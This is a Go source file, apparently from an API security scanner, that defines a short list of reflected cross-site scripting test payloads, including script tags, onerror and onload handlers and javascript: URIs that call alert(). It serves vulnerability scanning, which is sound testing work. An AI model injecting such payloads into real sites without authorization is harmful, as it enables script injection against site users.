package payload

import "github.com/alkaid/goapiscanner/internal/model"

func xss() []Item {
	vals := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"\"><svg/onload=alert(1)>",
		"'\"><script>alert(document.domain)</script>",
		"<body onload=alert(1)>",
		"<iframe src=javascript:alert(1)>",
		"<math><mtext></mtext><script>alert(1)</script>",
		"javascript:alert(1)",
	}
	out := make([]Item, 0, len(vals))
	for _, v := range vals {
		out = append(out, Item{Class: model.ClassXSS, Value: v, Hint: "reflected"})
	}
	return out
}
